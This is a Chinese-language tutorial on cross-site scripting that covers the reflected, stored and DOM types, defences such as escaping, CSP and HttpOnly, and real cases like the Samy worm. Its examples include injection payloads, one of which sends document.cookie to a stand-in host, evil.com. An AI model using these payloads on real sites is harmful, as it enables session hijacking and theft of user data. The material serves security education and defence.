# XSS — 跨站脚本攻击 (Cross-Site Scripting)

## 原理

XSS 是攻击者将恶意 JavaScript 代码注入到网页中，当其他用户访问该页面时，恶意代码在用户的浏览器中执行。

根本原因：**Web 应用将用户输入的内容直接输出到页面中，没有进行转义或过滤**。

## 三种类型

### 1. 反射型 XSS（非持久型）

恶意代码在 URL 参数中，服务器原样返回并执行。

**流程**：
1. 攻击者构造恶意链接：`http://example.com/search?q=<script>alert('xss')</script>`
2. 诱导用户点击链接
3. 服务器将搜索关键词直接嵌入页面返回
4. 受害者的浏览器执行恶意脚本

**特点**：需要诱导用户点击，一次性，不存储在服务器。

### 2. 存储型 XSS（持久型）

恶意代码被存储到服务器数据库，每次加载页面都会执行。

**流程**：
1. 攻击者在评论区提交：`<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>`
2. 服务器将评论存入数据库
3. 所有访问该页面的用户都会执行恶意脚本
4. 攻击者获取到其他用户的 Cookie

**特点**：最危险，无需额外诱导，任何访问者都可能受害。

### 3. DOM 型 XSS

恶意代码通过修改页面的 DOM 结构来执行，不经过服务器处理。

**示例**：
```javascript
// 有漏洞的 JavaScript
var name = document.location.hash.substring(1);
document.getElementById('welcome').innerHTML = "欢迎，" + name;
```
如果 URL 是 `http://example.com/#<img src=x onerror=alert(1)>`，脚本就会执行。

**特点**：服务器响应是正常的，漏洞完全在客户端 JavaScript 中。

## XSS 能做什么

- 窃取用户的 Cookie（会话劫持）
- 伪造登录表单（钓鱼）
- 记录键盘输入（键盘记录器）
- 篡改页面内容
- 发起 CSRF 攻击（以受害者身份操作）
- 传播蠕虫（如在社交网络上自动发帖）

## 防御

| 防御措施 | 说明 | 适用场景 |
|----------|------|----------|
| HTML 实体转义 | `<` → `&lt;`，`>` → `&gt;` | 普通文本输出 |
| 内容安全策略（CSP） | 限制哪些来源的脚本可以执行 | 全局防御 |
| HttpOnly Cookie | 标记 Cookie 不能被 JavaScript 读取 | 防 Cookie 窃取 |
| 输入过滤 | 移除或转义 `<script>`、`onerror=` 等标签 | 辅助手段 |
| 输出编码 | 根据上下文（HTML/JS/CSS/URL）不同编码 | 全面防御 |

### 不同上下文的编码方式

| 上下文 | 编码方式 | 示例 |
|--------|----------|------|
| HTML 内容 | HTML 实体编码 | `&lt;script&gt;` |
| HTML 属性 | 属性值转义 | `onclick="..."` 中的 `"` 转 `&quot;` |
| JavaScript 字符串 | Unicode 转义 | `\u003cscript\u003e` |
| URL 参数 | URL 编码 | `%3Cscript%3E` |

### 安全代码示例（Java）

```java
// 危险
out.println("欢迎，" + request.getParameter("name"));

// 安全（HTML 转义）
out.println("欢迎，" + StringEscapeUtils.escapeHtml4(request.getParameter("name")));
```

## 真实案例

### 案例 1：2005 年 Samy 蠕虫（MySpace）
- 手法：存储型 XSS，攻击者在个人简介中注入 JS 代码
- 影响：24 小时内感染了 100 万用户，自动将攻击者加为好友
- 教训：社交平台是 XSS 的重灾区

### 案例 2：2018 年 British Airways 数据泄露
- 手法：在支付页面注入恶意脚本（Magecart 攻击）
- 影响：38 万客户的信用卡信息被窃取
- 教训：第三方脚本引入的 XSS 风险

## 在 Pikachu 靶场中的对应模块

Pikachu 提供了反射型 XSS（GET/POST）、存储型 XSS、DOM 型 XSS、XSS 盲打、XSS 过滤绕过、htmlspecialchars 绕过、href 输出、JS 输出等多种练习场景。
